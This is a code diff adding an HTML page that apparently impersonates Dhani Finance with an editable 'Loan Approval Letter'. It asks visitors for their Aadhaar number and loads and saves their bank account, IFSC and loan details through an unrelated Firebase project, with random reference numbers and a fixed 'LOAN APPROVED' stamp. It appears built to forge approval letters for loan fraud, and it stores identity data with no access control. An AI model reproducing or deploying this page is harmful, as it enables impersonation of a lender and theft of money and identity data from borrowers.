@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Loan Approval Letter – Dhani Finance Ltd</title>
+
+<style>
+body{margin:0;padding:0;font-family:Arial;background:#f4f6fb;color:#111;}
+.wrap{max-width:900px;margin:20px auto;padding:15px;background:#fff;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1);}
+
+/* Headings */
+h2{margin:0 0 10px;}
+
+/* Labels + Boxes */
+.label{font-weight:700;margin-top:10px;}
+.box{border:1px solid #ccc;border-radius:8px;padding:12px;margin-bottom:12px;background:#f9fafb;}
+.inputField{width:100%;padding:6px 8px;margin:4px 0;border-radius:6px;border:1px solid #ccc;font-size:14px;}
+
+/* EMI Table */
+.emi-table{width:100%;border-collapse:collapse;margin-top:10px;}
+.emi-table th,.emi-table td{border:1px solid #ccc;padding:6px;text-align:left;font-size:14px;}
+
+/* Signature Area */
+.sign-section{display:flex;justify-content:space-between;margin-top:30px;}
+.stamp{border:2px solid green;padding:10px;border-radius:6px;font-weight:700;color:green;}
+.sign{font-weight:700;}
+
+/* Button */
+button{margin-top:10px;padding:8px 12px;border:none;border-radius:6px;background:#2563eb;color:#fff;font-weight:700;cursor:pointer;}
+
+/* PAGE 2 SECTION */
+.page2{
+  margin-top:40px;
+  padding:20px;
+  border-radius:12px;
+  background:#fff;
+  box-shadow:0 4px 15px rgba(0,0,0,0.1);
+}
+.page2 h2{
+  text-align:center;
+  text-decoration:underline;
+  margin-bottom:20px;
+}
+.section-title{
+  font-size:20px;
+  margin-top:30px;
+  font-weight:bold;
+  color:#003399;
+  text-decoration:underline;
+}
+.page2 p{
+  font-size:16px;
+  margin-bottom:12px;
+}
+.divider{
+  border-bottom:2px dashed #555;
+  margin:25px 0;
+}
+</style>
+</head>
+
+
+
+<body>
+
+<div class="wrap">
+
+  <h2>Loan Approval Letter</h2>
+
+  <!-- Approval Message -->
+  <div class="label">Message:</div>
+  <textarea id="approvalMsg" class="inputField" rows="6"></textarea>
+
+  <!-- Reference + Bank Details -->
+  <div class="label">Reference & Bank Details:</div>
+  <div class="box">
+    <div>Reference No: <input type="text" id="referenceNo" class="inputField" readonly></div>
+    <div>Application No: <input type="text" id="applicationNo" class="inputField" readonly></div>
+    <div>Bank Name: <input type="text" id="bankName" class="inputField" placeholder="Bank Name"></div>
+    <div>Account No: <input type="text" id="accountNo" class="inputField" placeholder="Account Number"></div>
+    <div>IFSC Code: <input type="text" id="ifscCode" class="inputField" placeholder="IFSC Code"></div>
+  </div>
+
+  <!-- EMI Details -->
+  <div class="label">EMI Details:</div>
+  <table class="emi-table">
+    <tr>
+      <th>EMI</th>
+      <th>Loan Amount</th>
+      <th>Tenure (Months)</th>
+      <th>Interest (%)</th>
+    </tr>
+    <tr>
+      <td><input type="text" id="emi" class="inputField"></td>
+      <td><input type="text" id="loanAmount" class="inputField"></td>
+      <td><input type="text" id="tenure" class="inputField"></td>
+      <td><input type="text" id="interest" class="inputField"></td>
+    </tr>
+  </table>
+
+  <!-- Stamp + Signature -->
+  <div class="sign-section">
+    <div class="stamp">LOAN APPROVED</div>
+    <div class="sign">Dhani Finance Pvt. Ltd</div>
+  </div>
+
+  <button onclick="saveApprovalLetter()">Save/Update</button>
+</div>
+
+
+
+
+<!-- PAGE 2 – ABOUT DHANI FINANCE -->
+<div class="page2">
+
+  <h2>About Dhani Finance Ltd (Page 2)</h2>
+
+  <!-- ENGLISH -->
+  <div class="section-title">About Dhani Finance Ltd (English)</div>
+  <p>Dhani Finance Limited is a leading Indian financial institution committed to providing quick, secure and reliable lending services. Our mission is to make personal and business finance easier and more accessible for every citizen by offering transparent loan solutions.</p>
+
+  <p>The company uses advanced technology to verify customer details securely using Aadhaar, PAN, and banking information, ensuring the highest level of data protection and accuracy.</p>
+
+  <p>Dhani Finance Ltd offers multiple loan products including personal loans, emergency loans, and business loans with flexible tenure and easy EMI repayment options.</p>
+
+  <p>The approval process is fully digital and monitored by our verification team, ensuring transparency in interest rates, processing fees and repayment schedules.</p>
+
+  <div class="divider"></div>
+
+  <!-- HINDI -->
+  <div class="section-title">धनी फाइनेंस लिमिटेड के बारे में (Hindi)</div>
+  <p>धनी फाइनेंस लिमिटेड भारत की एक प्रमुख वित्तीय संस्था है, जो तेज़, सुरक्षित और विश्वसनीय लोन सेवाएं प्रदान करती है। हमारा उद्देश्य देश के प्रत्येक नागरिक को सरल, तेज और पारदर्शी वित्तीय सहायता प्रदान करना है।</p>
+
+  <p>कंपनी उन्नत तकनीक का उपयोग करके ग्राहक की जानकारी जैसे आधार, पैन और बैंक विवरण का पूर्णतः सुरक्षित सत्यापन करती है, जिससे डेटा की सुरक्षा और शुद्धता सुनिश्चित होती है।</p>
+
+  <p>धनी फाइनेंस लिमिटेड व्यक्तिगत, आपातकालीन और व्यावसायिक लोन उपलब्ध कराती है, जिनमें आसान EMI विकल्प और लचीली अवधि शामिल है।</p>
+
+  <p>हम ब्याज दरों, शुल्क और भुगतान विकल्पों में पूरी पारदर्शिता रखते हैं, ताकि ग्राहक सुरक्षित और सुविधाजनक तरीके से सभी लाभ प्राप्त कर सकें।</p>
+
+</div>
+
+
+
+
+
+
+
+<!-- FIREBASE -->
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-auth-compat.js"></script>
+
+<script>
+// Firebase config
+const firebaseConfig = {
+  apiKey: "AIzaSyB-ipqoUdwFYKvSKdBXe0ivw8Ph47IyjfE",
+  authDomain: "incoinpaysliveearning.firebaseapp.com",
+  databaseURL: "https://incoinpaysliveearning-default-rtdb.firebaseio.com",
+  projectId: "incoinpaysliveearning",
+  storageBucket: "incoinpaysliveearning.firebasestorage.app",
+  messagingSenderId: "971873814750",
+  appId: "1:971873814750:web:a041db81d7159397ed9a4f"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+
+// Ask Aadhaar
+const USER_AADHAAR = prompt("Enter your Aadhaar to load approval letter:");
+
+// Elements
+const approvalMsg = document.getElementById('approvalMsg');
+const referenceNo = document.getElementById('referenceNo');
+const applicationNo = document.getElementById('applicationNo');
+const bankName = document.getElementById('bankName');
+const accountNo = document.getElementById('accountNo');
+const ifscCode = document.getElementById('ifscCode');
+const emi = document.getElementById('emi');
+const loanAmount = document.getElementById('loanAmount');
+const tenure = document.getElementById('tenure');
+const interest = document.getElementById('interest');
+
+
+// Load data
+db.ref('loanApplications/'+USER_AADHAAR).once('value').then(snap=>{
+  const data = snap.val();
+  if(!data){ alert("Application not found!"); return; }
+
+  const name = data.name || "User";
+  const amount = data.amount || 0;
+  const appNo = data.applicationNo || "APP"+Math.floor(Math.random()*1000000);
+  const refNo = "Dhani"+Math.floor(10000000 + Math.random()*90000000);
+
+  approvalMsg.value =
+`Dear ${name},
+
+Dhani Finance Ltd welcomes ${name}. We are pleased to inform you that your application for amount of Rs ${amount} has been accepted. The information mentioned by you has been investigated secretly by the company team through online Aadhaar/PAN verification.
+
+Application details are given below.`;
+
+  referenceNo.value = refNo;
+  applicationNo.value = appNo;
+  bankName.value = data.bankName || "";
+  accountNo.value = data.accountNo || "";
+  ifscCode.value = data.ifsc || "";
+  emi.value = data.emi || "";
+  loanAmount.value = amount;
+  tenure.value = data.tenure || "";
+  interest.value = data.interest || "";
+});
+
+
+// Save/update
+function saveApprovalLetter(){
+  const updates = {
+    approvalMsg: approvalMsg.value,
+    referenceNo: referenceNo.value,
+    applicationNo: applicationNo.value,
+    bankName: bankName.value,
+    accountNo: accountNo.value,
+    ifsc: ifscCode.value,
+    emi: emi.value,
+    loanAmount: loanAmount.value,
+    tenure: tenure.value,
+    interest: interest.value
+  };
+  db.ref('loanApplications/'+USER_AADHAAR+'/approvalLetter').set(updates)
+    .then(()=>alert("Approval letter saved successfully!"))
+    .catch(err=>alert("Error: "+err.message));
+}
+</script>
+
+</body>
+</html>
